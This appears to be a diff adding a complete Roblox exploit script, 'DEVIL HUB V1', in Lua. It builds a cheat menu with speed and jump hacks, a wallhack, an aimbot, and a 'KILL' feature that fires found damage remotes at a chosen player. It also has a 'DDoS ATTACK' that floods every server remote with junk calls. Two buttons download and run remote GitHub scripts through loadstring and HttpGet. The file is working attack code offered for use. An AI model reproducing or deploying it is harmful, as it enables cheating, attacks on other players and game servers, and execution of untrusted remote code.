@@ -1,0 +1,806 @@
+local ScreenGui = Instance.new("ScreenGui")
+local MainFrame = Instance.new("Frame")
+local Title = Instance.new("TextLabel")
+local CloseButton = Instance.new("TextButton")
+local ScrollFrame = Instance.new("ScrollingFrame")
+local UIListLayout = Instance.new("UIListLayout")
+
+local SpeedButton = Instance.new("TextButton")
+local JumpButton = Instance.new("TextButton")
+local KillButton = Instance.new("TextButton")
+local FlingButton = Instance.new("TextButton")
+local WallhackButton = Instance.new("TextButton")
+local AimbotButton = Instance.new("TextButton")
+local AC6Button = Instance.new("TextButton")
+local DDoSButton = Instance.new("TextButton")
+local StatusLabel = Instance.new("TextLabel")
+
+local player = game.Players.LocalPlayer
+local camera = game.Workspace.CurrentCamera
+local mouse = player:GetMouse()
+local runService = game:GetService("RunService")
+local userInputService = game:GetService("UserInputService")
+
+ScreenGui.Name = "DEVILHUB"
+ScreenGui.Parent = game.CoreGui
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.ResetOnSpawn = false
+
+MainFrame.Name = "MainFrame"
+MainFrame.Parent = ScreenGui
+MainFrame.BackgroundColor3 = Color3.fromRGB(20, 0, 30)
+MainFrame.BorderSizePixel = 0
+MainFrame.Position = UDim2.new(0.5, -250, 0.5, -380)
+MainFrame.Size = UDim2.new(0, 450, 0, 700)
+MainFrame.Active = true
+MainFrame.Draggable = true
+MainFrame.ClipsDescendants = true
+
+local Corner = Instance.new("UICorner")
+Corner.CornerRadius = UDim.new(0, 12)
+Corner.Parent = MainFrame
+
+local Shadow = Instance.new("ImageLabel")
+Shadow.Name = "Shadow"
+Shadow.Parent = MainFrame
+Shadow.BackgroundTransparency = 1
+Shadow.Position = UDim2.new(0, -8, 0, -8)
+Shadow.Size = UDim2.new(1, 16, 1, 16)
+Shadow.Image = "rbxassetid://1316045217"
+Shadow.ImageColor3 = Color3.fromRGB(60, 0, 80)
+Shadow.ImageTransparency = 0.4
+Shadow.ScaleType = Enum.ScaleType.Slice
+Shadow.SliceCenter = Rect.new(10, 10, 118, 118)
+
+Title.Name = "Title"
+Title.Parent = MainFrame
+Title.BackgroundColor3 = Color3.fromRGB(45, 0, 75)
+Title.BorderSizePixel = 0
+Title.Size = UDim2.new(1, 0, 0, 50)
+Title.Font = Enum.Font.GothamBold
+Title.Text = "DEVIL HUB V1"
+Title.TextColor3 = Color3.fromRGB(200, 150, 255)
+Title.TextSize = 24
+Title.BackgroundTransparency = 0.2
+
+local TitleGradient = Instance.new("UIGradient")
+TitleGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(100, 0, 150)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(50, 0, 100))
+})
+TitleGradient.Rotation = 90
+TitleGradient.Parent = Title
+
+local TitleCorner = Instance.new("UICorner")
+TitleCorner.CornerRadius = UDim.new(0, 12)
+TitleCorner.Parent = Title
+
+CloseButton.Name = "CloseButton"
+CloseButton.Parent = MainFrame
+CloseButton.BackgroundColor3 = Color3.fromRGB(140, 0, 70)
+CloseButton.BorderSizePixel = 0
+CloseButton.Position = UDim2.new(1, -45, 0, 10)
+CloseButton.Size = UDim2.new(0, 35, 0, 35)
+CloseButton.Font = Enum.Font.GothamBold
+CloseButton.Text = "X"
+CloseButton.TextColor3 = Color3.fromRGB(255, 200, 255)
+CloseButton.TextSize = 20
+CloseButton.AutoButtonColor = false
+
+local CloseCorner = Instance.new("UICorner")
+CloseCorner.CornerRadius = UDim.new(0, 8)
+CloseCorner.Parent = CloseButton
+
+CloseButton.MouseButton1Click:Connect(function()
+    ScreenGui:Destroy()
+end)
+
+CloseButton.MouseEnter:Connect(function()
+    CloseButton.BackgroundColor3 = Color3.fromRGB(180, 0, 90)
+end)
+
+CloseButton.MouseLeave:Connect(function()
+    CloseButton.BackgroundColor3 = Color3.fromRGB(140, 0, 70)
+end)
+
+ScrollFrame.Name = "ScrollFrame"
+ScrollFrame.Parent = MainFrame
+ScrollFrame.BackgroundColor3 = Color3.fromRGB(25, 0, 35)
+ScrollFrame.BorderSizePixel = 0
+ScrollFrame.Position = UDim2.new(0, 15, 0, 65)
+ScrollFrame.Size = UDim2.new(1, -30, 1, -170)
+ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+ScrollFrame.ScrollBarThickness = 8
+ScrollFrame.ScrollBarImageColor3 = Color3.fromRGB(140, 0, 255)
+ScrollFrame.BackgroundTransparency = 0.3
+
+local ScrollCorner = Instance.new("UICorner")
+ScrollCorner.CornerRadius = UDim.new(0, 10)
+ScrollCorner.Parent = ScrollFrame
+
+UIListLayout.Parent = ScrollFrame
+UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+UIListLayout.Padding = UDim.new(0, 12)
+UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+
+local AimbotRadiusFrame = Instance.new("Frame")
+AimbotRadiusFrame.Parent = ScrollFrame
+AimbotRadiusFrame.BackgroundColor3 = Color3.fromRGB(30, 0, 40)
+AimbotRadiusFrame.BorderSizePixel = 0
+AimbotRadiusFrame.Size = UDim2.new(1, -20, 0, 60)
+AimbotRadiusFrame.BackgroundTransparency = 0.2
+
+local RadiusCorner = Instance.new("UICorner")
+RadiusCorner.CornerRadius = UDim.new(0, 8)
+RadiusCorner.Parent = AimbotRadiusFrame
+
+local RadiusLabel = Instance.new("TextLabel")
+RadiusLabel.Parent = AimbotRadiusFrame
+RadiusLabel.BackgroundTransparency = 1
+RadiusLabel.Size = UDim2.new(1, -20, 0, 25)
+RadiusLabel.Position = UDim2.new(0, 10, 0, 5)
+RadiusLabel.Font = Enum.Font.Gotham
+RadiusLabel.Text = "Aimbot Circle Size"
+RadiusLabel.TextColor3 = Color3.fromRGB(200, 150, 255)
+RadiusLabel.TextSize = 14
+RadiusLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+local RadiusValue = Instance.new("TextLabel")
+RadiusValue.Parent = AimbotRadiusFrame
+RadiusValue.BackgroundTransparency = 1
+RadiusValue.Size = UDim2.new(0, 50, 0, 25)
+RadiusValue.Position = UDim2.new(1, -60, 0, 5)
+RadiusValue.Font = Enum.Font.GothamBold
+RadiusValue.Text = "150"
+RadiusValue.TextColor3 = Color3.fromRGB(255, 255, 255)
+RadiusValue.TextSize = 14
+
+local RadiusSlider = Instance.new("Frame")
+RadiusSlider.Parent = AimbotRadiusFrame
+RadiusSlider.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
+RadiusSlider.BorderSizePixel = 0
+RadiusSlider.Position = UDim2.new(0, 10, 0, 35)
+RadiusSlider.Size = UDim2.new(1, -20, 0, 15)
+
+local SliderCorner = Instance.new("UICorner")
+SliderCorner.CornerRadius = UDim.new(1, 0)
+SliderCorner.Parent = RadiusSlider
+
+local SliderButton = Instance.new("TextButton")
+SliderButton.Name = "RadiusSliderButton"
+SliderButton.Parent = RadiusSlider
+SliderButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+SliderButton.BorderSizePixel = 0
+SliderButton.Position = UDim2.new(0, 0, 0, 0)
+SliderButton.Size = UDim2.new(0, 20, 1, 0)
+SliderButton.Text = ""
+
+local SliderButtonCorner = Instance.new("UICorner")
+SliderButtonCorner.CornerRadius = UDim.new(1, 0)
+SliderButtonCorner.Parent = SliderButton
+
+local function createButton(name)
+    local button = Instance.new("TextButton")
+    button.Name = name .. "Button"
+    button.Parent = ScrollFrame
+    button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    button.BorderSizePixel = 0
+    button.Size = UDim2.new(1, -20, 0, 55)
+    button.Font = Enum.Font.GothamBold
+    button.Text = name
+    button.TextColor3 = Color3.fromRGB(255, 255, 255)
+    button.TextSize = 20
+    button.AutoButtonColor = false
+    
+    local btnCorner = Instance.new("UICorner")
+    btnCorner.CornerRadius = UDim.new(0, 10)
+    btnCorner.Parent = button
+    
+    button.MouseEnter:Connect(function()
+        button:TweenSize(UDim2.new(1, -15, 0, 60), "Out", "Quad", 0.2)
+    end)
+    
+    button.MouseLeave:Connect(function()
+        button:TweenSize(UDim2.new(1, -20, 0, 55), "Out", "Quad", 0.2)
+    end)
+    
+    return button
+end
+
+SpeedButton = createButton("SPEED")
+JumpButton = createButton("JUMP")
+KillButton = createButton("KILL")
+FlingButton = createButton("FLING")
+WallhackButton = createButton("WALLHACK")
+AimbotButton = createButton("AIMBOT")
+AC6Button = createButton("AC6 SOUND")
+DDoSButton = createButton("DDoS ATTACK")
+
+StatusLabel.Parent = MainFrame
+StatusLabel.BackgroundColor3 = Color3.fromRGB(30, 0, 45)
+StatusLabel.BorderSizePixel = 0
+StatusLabel.Position = UDim2.new(0, 15, 1, -70)
+StatusLabel.Size = UDim2.new(1, -30, 0, 55)
+StatusLabel.Font = Enum.Font.Gotham
+StatusLabel.Text = "Status: Devil Ready"
+StatusLabel.TextColor3 = Color3.fromRGB(200, 150, 255)
+StatusLabel.TextSize = 16
+StatusLabel.BackgroundTransparency = 0.3
+
+local StatusCorner = Instance.new("UICorner")
+StatusCorner.CornerRadius = UDim.new(0, 10)
+StatusCorner.Parent = StatusLabel
+
+local StatusGradient = Instance.new("UIGradient")
+StatusGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(75, 0, 130)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(45, 0, 75))
+})
+StatusGradient.Rotation = 90
+StatusGradient.Parent = StatusLabel
+
+ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, UIListLayout.AbsoluteContentSize.Y + 70)
+
+UIListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+    ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, UIListLayout.AbsoluteContentSize.Y + 80)
+end)
+
+local speedEnabled = false
+local jumpEnabled = false
+local wallhackEnabled = false
+local aimbotEnabled = false
+local ddosActive = false
+
+local originalSpeed = 16
+local originalJump = 50
+local currentSpeed = 120
+local currentJump = 250
+local aimbotRadius = 150
+local aimbotSmoothness = 0.3
+
+local espHighlights = {}
+local aimbotCircle = nil
+local aimbotConnection = nil
+local ddosThreads = {}
+
+local function updateStatus(text, isError)
+    StatusLabel.Text = "Status: " .. text
+    StatusLabel.TextColor3 = isError and Color3.fromRGB(255, 100, 150) or Color3.fromRGB(180, 100, 255)
+end
+
+local function createAimbotCircle()
+    if aimbotCircle then aimbotCircle:Destroy() end
+    aimbotCircle = Drawing.new("Circle")
+    aimbotCircle.Visible = false
+    aimbotCircle.Thickness = 3
+    aimbotCircle.NumSides = 64
+    aimbotCircle.Radius = aimbotRadius
+    aimbotCircle.Color = Color3.fromRGB(255, 0, 255)
+    aimbotCircle.Filled = false
+    aimbotCircle.Transparency = 1
+    aimbotCircle.Position = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2)
+end
+
+local function updateAimbotRadius(newRadius)
+    aimbotRadius = newRadius
+    RadiusValue.Text = tostring(math.floor(aimbotRadius))
+    if aimbotCircle then
+        aimbotCircle.Radius = aimbotRadius
+    end
+end
+
+SliderButton.MouseButton1Down:Connect(function()
+    local connection
+    connection = userInputService.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement then
+            local pos = math.clamp((input.Position.X - RadiusSlider.AbsolutePosition.X) / RadiusSlider.AbsoluteSize.X, 0, 1)
+            SliderButton.Position = UDim2.new(pos, 0, 0, 0)
+            local newRadius = 50 + (pos * 450)
+            updateAimbotRadius(newRadius)
+        end
+    end)
+    
+    userInputService.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            connection:Disconnect()
+        end
+    end)
+end)
+
+local function getTeamColor(targetPlayer)
+    if not targetPlayer or not targetPlayer.Character then return Color3.fromRGB(255, 0, 0) end
+    local success, result = pcall(function()
+        if player.Team and targetPlayer.Team then
+            return player.Team == targetPlayer.Team
+        end
+        return false
+    end)
+    return (success and result) and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
+end
+
+local function clearESP()
+    for _, highlight in pairs(espHighlights) do
+        if highlight then
+            pcall(function()
+                highlight:Destroy()
+            end)
+        end
+    end
+    espHighlights = {}
+end
+
+local function createHighlightForPlayer(targetPlayer)
+    if espHighlights[targetPlayer] or targetPlayer == player then return end
+    
+    if targetPlayer.Character then
+        local highlight = Instance.new("Highlight")
+        highlight.Name = "DevilESP"
+        highlight.Parent = targetPlayer.Character
+        highlight.FillColor = getTeamColor(targetPlayer)
+        highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
+        highlight.FillTransparency = 0.3
+        highlight.OutlineTransparency = 0
+        highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+        
+        espHighlights[targetPlayer] = highlight
+    end
+    
+    targetPlayer.CharacterAdded:Connect(function()
+        task.wait(1)
+        if wallhackEnabled and targetPlayer ~= player then
+            local newHighlight = Instance.new("Highlight")
+            newHighlight.Name = "DevilESP"
+            newHighlight.Parent = targetPlayer.Character
+            newHighlight.FillColor = getTeamColor(targetPlayer)
+            newHighlight.OutlineColor = Color3.fromRGB(255, 255, 255)
+            newHighlight.FillTransparency = 0.3
+            newHighlight.OutlineTransparency = 0
+            newHighlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+            espHighlights[targetPlayer] = newHighlight
+        end
+    end)
+end
+
+local function toggleWallhack(state)
+    clearESP()
+    
+    if not state then
+        updateStatus("Wallhack Disabled")
+        return
+    end
+    
+    for _, otherPlayer in pairs(game.Players:GetPlayers()) do
+        if otherPlayer ~= player then
+            createHighlightForPlayer(otherPlayer)
+        end
+    end
+    
+    game.Players.PlayerAdded:Connect(function(newPlayer)
+        if newPlayer ~= player then
+            task.wait(1)
+            createHighlightForPlayer(newPlayer)
+        end
+    end)
+    
+    runService.RenderStepped:Connect(function()
+        if wallhackEnabled then
+            for otherPlayer, highlight in pairs(espHighlights) do
+                if otherPlayer and otherPlayer.Character and highlight then
+                    highlight.FillColor = getTeamColor(otherPlayer)
+                end
+            end
+        end
+    end)
+    
+    updateStatus("Wallhack Active")
+end
+
+local function getClosestTarget()
+    local closest = nil
+    local shortestDistance = aimbotRadius
+    local mousePos = Vector2.new(mouse.X, mouse.Y)
+    
+    for _, otherPlayer in pairs(game.Players:GetPlayers()) do
+        if otherPlayer ~= player and otherPlayer.Character then
+            local character = otherPlayer.Character
+            local humanoid = character:FindFirstChild("Humanoid")
+            local head = character:FindFirstChild("Head")
+            
+            if humanoid and humanoid.Health > 0 and head then
+                local headPos, onScreen = camera:WorldToViewportPoint(head.Position)
+                
+                if onScreen then
+                    local screenPos = Vector2.new(headPos.X, headPos.Y)
+                    local distance = (screenPos - mousePos).Magnitude
+                    
+                    if distance < shortestDistance then
+                        local isEnemy = true
+                        local success, result = pcall(function()
+                            if player.Team and otherPlayer.Team then
+                                return player.Team ~= otherPlayer.Team
+                            end
+                            return true
+                        end)
+                        
+                        if success then
+                            isEnemy = result
+                        end
+                        
+                        if isEnemy then
+                            shortestDistance = distance
+                            closest = otherPlayer
+                        end
+                    end
+                end
+            end
+        end
+    end
+    
+    return closest
+end
+
+local function toggleAimbot(state)
+    if aimbotConnection then
+        aimbotConnection:Disconnect()
+        aimbotConnection = nil
+    end
+    
+    if aimbotCircle then
+        aimbotCircle.Visible = state
+        aimbotCircle.Radius = aimbotRadius
+    else
+        createAimbotCircle()
+        aimbotCircle.Visible = state
+        aimbotCircle.Radius = aimbotRadius
+    end
+    
+    if not state then
+        updateStatus("Aimbot Disabled")
+        return
+    end
+    
+    aimbotConnection = runService.RenderStepped:Connect(function()
+        if not aimbotCircle then 
+            createAimbotCircle() 
+            aimbotCircle.Radius = aimbotRadius
+        end
+        aimbotCircle.Position = Vector2.new(mouse.X, mouse.Y)
+        aimbotCircle.Radius = aimbotRadius
+        aimbotCircle.Visible = aimbotEnabled
+        
+        local target = getClosestTarget()
+        
+        if target and target.Character and target.Character:FindFirstChild("Head") then
+            local head = target.Character.Head
+            local targetPos = head.Position
+            local currentPos = camera.CFrame.Position
+            local newPos = currentPos:Lerp(targetPos, aimbotSmoothness)
+            camera.CFrame = CFrame.new(currentPos, targetPos)
+            aimbotCircle.Color = Color3.fromRGB(0, 255, 0)
+        else
+            aimbotCircle.Color = Color3.fromRGB(255, 0, 255)
+        end
+    end)
+    
+    updateStatus("Aimbot Active (Smooth)")
+end
+
+local function showPlayerList(callback)
+    local listGui = Instance.new("ScreenGui")
+    listGui.Parent = game.CoreGui
+    listGui.Name = "DevilList"
+    
+    local listFrame = Instance.new("Frame")
+    listFrame.Parent = listGui
+    listFrame.BackgroundColor3 = Color3.fromRGB(20, 0, 30)
+    listFrame.BorderSizePixel = 0
+    listFrame.Position = UDim2.new(0.5, -200, 0.5, -250)
+    listFrame.Size = UDim2.new(0, 400, 0, 500)
+    listFrame.Active = true
+    
+    local listCorner = Instance.new("UICorner")
+    listCorner.CornerRadius = UDim.new(0, 12)
+    listCorner.Parent = listFrame
+    
+    local listTitle = Instance.new("TextLabel")
+    listTitle.Parent = listFrame
+    listTitle.BackgroundColor3 = Color3.fromRGB(45, 0, 75)
+    listTitle.BorderSizePixel = 0
+    listTitle.Size = UDim2.new(1, 0, 0, 50)
+    listTitle.Font = Enum.Font.GothamBold
+    listTitle.Text = "Select Target"
+    listTitle.TextColor3 = Color3.fromRGB(200, 150, 255)
+    listTitle.TextSize = 22
+    
+    local listClose = Instance.new("TextButton")
+    listClose.Parent = listFrame
+    listClose.BackgroundColor3 = Color3.fromRGB(140, 0, 70)
+    listClose.BorderSizePixel = 0
+    listClose.Position = UDim2.new(1, -45, 0, 10)
+    listClose.Size = UDim2.new(0, 35, 0, 35)
+    listClose.Font = Enum.Font.GothamBold
+    listClose.Text = "X"
+    listClose.TextColor3 = Color3.fromRGB(255, 200, 255)
+    listClose.TextSize = 20
+    
+    local listCloseCorner = Instance.new("UICorner")
+    listCloseCorner.CornerRadius = UDim.new(0, 8)
+    listCloseCorner.Parent = listClose
+    
+    listClose.MouseButton1Click:Connect(function()
+        listGui:Destroy()
+    end)
+    
+    local listScroll = Instance.new("ScrollingFrame")
+    listScroll.Parent = listFrame
+    listScroll.BackgroundColor3 = Color3.fromRGB(25, 0, 35)
+    listScroll.BorderSizePixel = 0
+    listScroll.Position = UDim2.new(0, 15, 0, 65)
+    listScroll.Size = UDim2.new(1, -30, 1, -90)
+    listScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
+    listScroll.ScrollBarThickness = 8
+    listScroll.ScrollBarImageColor3 = Color3.fromRGB(140, 0, 255)
+    
+    local listLayout = Instance.new("UIListLayout")
+    listLayout.Parent = listScroll
+    listLayout.SortOrder = Enum.SortOrder.Name
+    listLayout.Padding = UDim.new(0, 8)
+    listLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+    
+    for _, otherPlayer in pairs(game.Players:GetPlayers()) do
+        if otherPlayer ~= player then
+            local playerButton = Instance.new("TextButton")
+            playerButton.Parent = listScroll
+            playerButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+            playerButton.BorderSizePixel = 0
+            playerButton.Size = UDim2.new(1, -20, 0, 45)
+            playerButton.Font = Enum.Font.Gotham
+            playerButton.Text = otherPlayer.Name
+            playerButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+            playerButton.TextSize = 18
+            
+            local btnCorner = Instance.new("UICorner")
+            btnCorner.CornerRadius = UDim.new(0, 8)
+            btnCorner.Parent = playerButton
+            
+            playerButton.MouseButton1Click:Connect(function()
+                callback(otherPlayer)
+                listGui:Destroy()
+            end)
+        end
+    end
+    
+    listLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+        listScroll.CanvasSize = UDim2.new(0, 0, 0, listLayout.AbsoluteContentSize.Y + 20)
+    end)
+end
+
+local function findDamageRemote()
+    local remote = nil
+    local potentialRemotes = {}
+    
+    for _, obj in pairs(game:GetDescendants()) do
+        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
+            local name = obj.Name:lower()
+            if name:find("damage") or name:find("hit") or name:find("take") or name:find("kill") or name:find("attack") or name:find("bullet") then
+                table.insert(potentialRemotes, obj)
+            end
+        end
+    end
+    
+    if #potentialRemotes > 0 then
+        remote = potentialRemotes[1]
+        updateStatus("Remote found: " .. remote.Name)
+    end
+    
+    return remote
+end
+
+local function killPlayer(targetPlayer)
+    if not targetPlayer or not targetPlayer.Character then
+        updateStatus("Target not found", true)
+        return
+    end
+    
+    local remote = findDamageRemote()
+    
+    if remote then
+        local args = {
+            [1] = targetPlayer,
+            [2] = targetPlayer.Character.Humanoid,
+            [3] = 9999,
+            [4] = player.Character.HumanoidRootPart.Position
+        }
+        
+        pcall(function()
+            remote:FireServer(unpack(args))
+        end)
+        
+        updateStatus(targetPlayer.Name .. " killed (remote)")
+    else
+        local character = targetPlayer.Character
+        local humanoid = character:FindFirstChild("Humanoid")
+        
+        if humanoid then
+            local success = pcall(function()
+                humanoid:Destroy()
+            end)
+            
+            if success then
+                updateStatus(targetPlayer.Name .. " killed (client)")
+            else
+                local rootPart = character:FindFirstChild("HumanoidRootPart")
+                if rootPart then
+                    rootPart.CFrame = CFrame.new(0, -500, 0)
+                    updateStatus(targetPlayer.Name .. " teleported to void")
+                end
+            end
+        end
+    end
+end
+
+local function startDDoS()
+    if ddosActive then
+        ddosActive = false
+        for _, thread in pairs(ddosThreads) do
+            if thread then
+                task.cancel(thread)
+            end
+        end
+        ddosThreads = {}
+        DDoSButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        updateStatus("DDoS stopped")
+        return
+    end
+    
+    ddosActive = true
+    DDoSButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+    updateStatus("DDoS started")
+    
+    local remotes = {}
+    for _, obj in pairs(game:GetDescendants()) do
+        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
+            table.insert(remotes, obj)
+        end
+    end
+    
+    updateStatus(#remotes .. " remotes found, attacking...")
+    
+    local function attackRemote(remote)
+        while ddosActive and remote and remote.Parent do
+            local success = pcall(function()
+                for i = 1, 100 do
+                    remote:FireServer({}, {}, {}, {}, {}, {}, {}, {}, {}, {}, i, math.random(), tick())
+                end
+            end)
+            if not success then
+                break
+            end
+            task.wait(0.01)
+        end
+    end
+    
+    for i, remote in pairs(remotes) do
+        local thread = task.spawn(function()
+            attackRemote(remote)
+        end)
+        table.insert(ddosThreads, thread)
+    end
+    
+    task.spawn(function()
+        while ddosActive do
+            for i = 1, 10 do
+                local newRemote = findDamageRemote()
+                if newRemote then
+                    local thread = task.spawn(function()
+                        attackRemote(newRemote)
+                    end)
+                    table.insert(ddosThreads, thread)
+                end
+            end
+            task.wait(1)
+        end
+    end)
+end
+
+SpeedButton.MouseButton1Click:Connect(function()
+    speedEnabled = not speedEnabled
+    local character = player.Character
+    if character then
+        local humanoid = character:FindFirstChild("Humanoid")
+        if humanoid then
+            if speedEnabled then
+                originalSpeed = humanoid.WalkSpeed
+                humanoid.WalkSpeed = currentSpeed
+                SpeedButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+                updateStatus("Speed Active (120)")
+            else
+                humanoid.WalkSpeed = 16
+                SpeedButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+                updateStatus("Speed Disabled")
+            end
+        end
+    end
+end)
+
+JumpButton.MouseButton1Click:Connect(function()
+    jumpEnabled = not jumpEnabled
+    local character = player.Character
+    if character then
+        local humanoid = character:FindFirstChild("Humanoid")
+        if humanoid then
+            if jumpEnabled then
+                originalJump = humanoid.JumpPower
+                humanoid.JumpPower = currentJump
+                JumpButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+                updateStatus("Jump Active (250)")
+            else
+                humanoid.JumpPower = 50
+                JumpButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+                updateStatus("Jump Disabled")
+            end
+        end
+    end
+end)
+
+KillButton.MouseButton1Click:Connect(function()
+    showPlayerList(function(selected)
+        killPlayer(selected)
+    end)
+end)
+
+FlingButton.MouseButton1Click:Connect(function()
+    updateStatus("Loading Fling...")
+    local success = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/K1LAS1K/Ultimate-Fling-GUI/main/flingscript.lua"))()
+    end)
+    if success then
+        updateStatus("Fling loaded")
+    else
+        updateStatus("Fling failed to load", true)
+    end
+end)
+
+WallhackButton.MouseButton1Click:Connect(function()
+    wallhackEnabled = not wallhackEnabled
+    toggleWallhack(wallhackEnabled)
+    WallhackButton.BackgroundColor3 = wallhackEnabled and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(0, 0, 0)
+end)
+
+AimbotButton.MouseButton1Click:Connect(function()
+    aimbotEnabled = not aimbotEnabled
+    toggleAimbot(aimbotEnabled)
+    AimbotButton.BackgroundColor3 = aimbotEnabled and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(0, 0, 0)
+end)
+
+AC6Button.MouseButton1Click:Connect(function()
+    updateStatus("Loading AC6 Sound...")
+    local success = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Roblox-HttpSpy/AC6-Music-Exploit/refs/heads/main/Ac6ExploitSource.luau"))()
+    end)
+    if success then
+        updateStatus("AC6 Sound loaded")
+    else
+        updateStatus("AC6 Sound failed to load", true)
+    end
+end)
+
+DDoSButton.MouseButton1Click:Connect(function()
+    startDDoS()
+end)
+
+createAimbotCircle()
+updateStatus("Devil Ready")
+
+userInputService.InputBegan:Connect(function(input)
+    if input.KeyCode == Enum.KeyCode.Insert then
+        MainFrame.Visible = not MainFrame.Visible
+    end
+end)
+
+player.CharacterAdded:Connect(function(char)
+    task.wait(0.5)
+    local humanoid = char:WaitForChild("Humanoid")
+    if speedEnabled then humanoid.WalkSpeed = currentSpeed end
+    if jumpEnabled then humanoid.JumpPower = currentJump end
+end)
